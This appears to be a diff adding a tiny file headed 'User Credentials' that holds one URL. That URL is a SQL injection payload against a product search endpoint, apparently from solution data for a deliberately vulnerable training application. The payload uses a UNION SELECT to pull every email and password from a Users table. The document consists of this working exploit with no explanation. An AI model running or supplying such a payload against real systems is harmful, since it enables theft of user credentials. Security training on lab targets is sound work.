@@ -1,0 +1,3 @@
+User Credentials
+"https://kue.echo.olymp/rest/product/search?q=q')) AND 1=2 UNION SELECT email||','||password,1,1,1,1,1,1,1 FROM Users --",
+
